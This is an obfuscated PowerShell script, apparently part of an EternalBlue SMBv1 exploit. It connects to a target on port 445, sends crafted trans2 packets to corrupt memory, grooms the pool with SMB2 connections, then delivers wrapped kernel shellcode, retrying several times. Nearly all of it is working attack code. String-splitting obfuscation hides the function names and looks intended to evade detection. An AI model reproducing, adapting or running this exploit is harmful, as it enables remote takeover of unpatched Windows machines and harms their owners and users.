function S`mB1`_lARg`e_BUff`ER(${sMb`H`E`ADEr},${So`CK}){

    ${NT`_`Tran`S_`pkT} = &("{6}{4}{3}{5}{7}{1}{2}{0}" -f't','pa','cke','_smb1','ke','_nt_tra','ma','ns_') ${sMBh`E`ADEr}."TrE`e`_iD" ${SmB`he`ADeR}."USer`_iD"

    

    ${SO`cK}.("{1}{0}" -f 'nd','Se').Invoke(${n`T_t`RANs_p`kT}) | &("{1}{2}{0}" -f 'l','out-nu','l')

    ${r`AW}, ${TraNsHEa`d`eR} = &("{5}{0}{2}{1}{4}{3}" -f'b1','t_res','_ge','nse','po','sm')(${S`ock})

    
    ${TrANs2`_PkT_`NuLL`Ed} = &("{3}{8}{4}{5}{2}{1}{7}{6}{0}" -f 't','ploit_pa','x','m','ke_smb1_trans','2_e','e','ck','a') ${Sm`BHE`AD`er}."TR`ee`_ID" ${sMBh`e`A`DEr}."u`Se`R_ID" ("{4}{3}{2}{0}{1}"-f's2_','zero','n','tra','eb_') 0

    
    for(${I} =1; ${i} -le 14; ${I}++) {
        ${T`RAnS2_`PkT_`NullEd} += &("{6}{0}{5}{3}{7}{1}{2}{4}"-f'ake','ns','2_exp','smb1','loit_packet','_','m','_tra') ${sMbhEA`d`er}."trEE`_`id" ${SM`Bhe`A`der}."USe`R_`id" ("{0}{1}{2}"-f'eb_','tran','s2_buffer') ${i}

    }

    ${TRa`Ns2_p`kT_NuL`LEd} += &("{2}{4}{1}{3}{0}{5}"-f '_pa','_ech','make_s','o','mb1','cket') ${sm`BHe`A`der}."Tr`ee_`ID"  ${SMB`HEAD`Er}."uSE`R_`id"
    ${so`CK}.("{0}{1}"-f 'Sen','d').Invoke(${tRAnS2_`pkt`_nU`LLEd}) | &("{1}{0}" -f'-null','out')

    &("{2}{3}{1}{0}" -f 'se','n','smb1_get_resp','o')(${sO`CK}) | &("{1}{0}{2}" -f 'Nu','Out-','ll')

}


function sMB1`_`FRee_`hoLE(${ST`A`RT}) {
   ${cl`I`eNT} = &("{3}{2}{1}{0}" -f'ject','Ob','-','New') ("{1}{3}{5}{7}{6}{2}{4}{0}"-f'lient','Sy','ts.Tcp','stem','C','.N','.Socke','et')(${T`ARgEt},445)

    ${So`ck} = ${cl`IeNt}."cl`IeNt"
    &("{3}{0}{2}{1}{4}"-f 'ent','i','_negot','cli','ate')(${S`Ock}) | &("{2}{1}{0}"-f '-Null','t','Ou')
    if(${S`T`ART}) {
        ${P`kT} =  &("{1}{9}{4}{6}{3}{8}{2}{5}{7}{0}" -f'packet','mak','e_se','ree_','_smb','s','1_f','sion_','hol','e') (0x07,0xc0) (0x2d,0x01) (0xf0,0xff,0x00,0x00,0x00)
    }
    else {
        ${p`kT} =  &("{3}{6}{1}{0}{5}{2}{4}" -f'le_','free_ho','ion_','make','packet','sess','_smb1_') (0x07,0x40) (0x2c,0x01) (0xf8,0x87,0x00,0x00,0x00)
    }

    ${s`OcK}.("{1}{0}" -f'nd','Se').Invoke(${p`Kt}) | &("{1}{0}{2}"-f 'ut-n','o','ull')
    &("{4}{0}{3}{1}{2}{5}"-f'b1_get','es','po','_r','sm','nse')(${So`cK}) | &("{0}{1}{2}"-f 'O','ut-Nul','l')
    return ${SO`CK}
}

     function s`mB2_G`ROomS(${tA`RGet}, ${GRo`O`Ms}, ${PaY`LOAd`_h`Dr`_PkT}, ${GrO`om_So`ckS}){


         for(${i} =0; ${i} -lt ${GR`OO`MS}; ${i}++)
         {
            ${cL`ie`Nt} = &("{0}{1}{2}{3}"-f 'New-O','b','j','ect') ("{6}{4}{5}{2}{3}{0}{1}" -f '.Sockets.TcpCli','ent','e','t','stem.','N','Sy')(${tA`RgEt},445)

             ${G`S`Ock} = ${cLIe`NT}."c`lieNT"
             ${gROoM`_soC`ks} += ${Gs`ocK}
             ${g`socK}.("{0}{1}" -f'Se','nd').Invoke(${paYLoAD`_`h`dr_P`kt}) | &("{0}{1}" -f 'out','-null')

         }
        return ${G`Room_s`oCKs}
     }




function sMb_`ET`eRn`A`lblUe(${TA`Rget}, ${g`Roo`ms}, ${SHeLlc`O`De}) {


    
    [Byte[]]  ${pa`yL`oaD} = [Byte[]](${ShE`llCO`De})

    ${sH`E`L`LCoDE} = &("{2}{3}{1}{4}{0}{5}" -f 'l','rn','make','_ke','el_user_pay','oad')(${PAYL`o`AD})
    ${p`AYlo`Ad_HDr_`PKt} = &("{7}{6}{5}{1}{4}{0}{2}{3}" -f'pack','mb2_payload_heade','e','t','rs_','s','ake_','m')
    ${pA`YlO`Ad`_boDY_pkT} = &("{3}{7}{0}{6}{1}{4}{5}{2}"-f'2_payloa','_b','t','make_s','ody','_packe','d','mb')(${SHElLc`O`de})

    &("{2}{3}{4}{1}{0}" -f'se','o','Write','-V','erb') ("{0}{4}{2}{1}{3}{5}" -f'Connecti','c',' to target for a','tivit','ng','ies')
     ${sMbh`eaD`eR}, ${so`ck} = &("{4}{6}{0}{1}{2}{7}{3}{5}"-f'anonymo','us_con','nec','i','smb1','pc','_','t_')(${t`Arg`eT})
     ${s`OcK}."reCEI`Ve`TiM`EOUt" =2000
     &("{2}{1}{0}" -f'ose','erb','Write-V') ("{6}{8}{5}{3}{7}{4}{0}{2}{1}" -f' ','n.','exploitatio','established ','r','n ','Connec','fo','tio')
           
           &("{1}{0}{2}"-f'ite-Ver','Wr','bose')  ("{9}{4}{6}{5}{1}{2}{3}{8}{7}{0}"-f'acket',' ','l','ast fragment of ','b','t','u','ploit p','ex','all ')
     &("{0}{1}{3}{2}{4}" -f 's','mb1_large_','f','bu','fer') ${smb`HeAD`er} ${S`OcK}
           

     
     ${Fhs_`So`Ck} = &("{4}{2}{1}{0}{3}" -f 're','f','b1_','e_hole','sm') ${t`RUE}
     ${GrO`OM_s`ocks} =@()
     ${gROOm`_`s`ockS} = &("{0}{1}{2}"-f 'sm','b2_gr','ooms') ${t`ArGET} ${G`Rooms} ${PaYloA`d`_`Hdr_`PkT} ${G`Roo`M`_SocKs}

     ${F`H`F_Sock} = &("{3}{2}{1}{4}{0}"-f 'ole','re','1_f','smb','e_h') ${f`ALSE}

     ${Fhs_`s`ock}.("{0}{1}" -f 'C','lose').Invoke() | &("{0}{2}{1}" -f 'Ou','ll','t-Nu')

     ${gR`Oom`_`SOCkS} = &("{1}{0}{2}{3}"-f 'gr','smb2_','o','oms') ${T`Ar`gET} 6 ${PAYlOAD_`Hd`R`_PKt} ${G`Roo`m_s`OCkS}

     ${fHf`_`SOCK}.("{1}{0}"-f'ose','Cl').Invoke() | &("{0}{2}{1}" -f 'o','ll','ut-nu')

     &("{0}{1}{2}{3}" -f'Writ','e-','Verb','ose') ("{2}{1}{3}{4}{0}{5}" -f 't','n','Ru','ning f','inal exploi',' packet')

     ${Fi`Na`l_eXPLo`I`T_`PKT} =  ${Tr`ANS2_`pKT_n`UllED} = &("{0}{5}{3}{8}{1}{2}{6}{7}{4}" -f 'make_','ran','s2_ex','b1','et','sm','ploit_p','ack','_t') ${SMbH`Ea`dEr}."tRe`E`_id" ${SmB`he`AD`er}."Use`R_`Id" ("{2}{1}{4}{3}{0}"-f 'ploit','ns','eb_tra','ex','2_')  15

     try{
     ${SO`ck}.("{0}{1}" -f 'Sen','d').Invoke(${final_EXpl`O`i`T_p`KT}) | &("{1}{0}{2}" -f 'l','Out-Nu','l')
      ${R`Aw}, ${exPLOit_Sm`B_H`Ea`deR} = &("{2}{3}{1}{0}" -f 'onse','t_resp','smb','1_ge') ${So`Ck}
      &("{2}{1}{0}" -f 'erbose','e-V','Writ') (("{0}{1}{2}" -f'S','MB',' code: ') +   (  gI  ('vari'+'A'+'bLe:Qu0')  )."va`LUE"::("{0}{2}{1}" -f'ToStri','g','n').Invoke(${EXpLO`iT_`s`mb_HE`AdER}."eRR`OR_CO`dE"))

     }
     catch {
      &("{1}{3}{0}{2}" -f'Verb','W','ose','rite-') ("{3}{5}{7}{1}{0}{9}{8}{4}{6}{2}" -f 'oit m',' expl','bly','socket ','l','e',' horri','rror,',' fai','ay')
     }


      &("{0}{1}{2}"-f 'W','rite-Ve','rbose') ("{6}{3}{1}{4}{0}{7}{5}{2}" -f'it',' payload','oms','d the',' w',' gro','Sen','h the')

     foreach (${GsO`ck} in ${GROoM_`S`oC`Ks})
     {
        ${G`S`Ock}."SE`ND"(${p`Ay`l`oaD_bODy_`p`Kt}[0..2919]) | &("{0}{1}{2}"-f'o','ut-n','ull')
     }
        foreach (${G`S`OCK} in ${GRoOM`_So`ckS})
     {
        ${gsO`Ck}."Se`ND"(${paY`LO`AD_`BOdY_pKT}[2920..4072]) | &("{2}{0}{1}"-f'u','t-null','o')
     }
         foreach (${g`sOCK} in ${G`R`OOM_sOckS})
     {
        ${gso`CK}.("{0}{1}"-f 'Clos','e').Invoke() | &("{2}{0}{1}" -f 'u','t-null','o')
     }

     ${s`Ock}.("{1}{0}" -f 'lose','C').Invoke()| &("{0}{2}{1}"-f'out-','ll','nu')
  }




${V`ERB`osEpr`EFerEnce} = ("{1}{0}" -f 'tinue','con')
for (${i}=0; ${I} -lt ${m`AXaT`TEmpTs}; ${i}++) {
    ${GRo`Oms} = ${iNIT`Ia`LGr`OOms} + ${G`ROOm`_DeL`Ta}*${I}
    &("{3}{0}{4}{1}{2}" -f 'b_eter','l','ue','sm','nalb') ${T`Ar`Get} ${gR`OO`mS} ${S`heLL`COdE}
}


}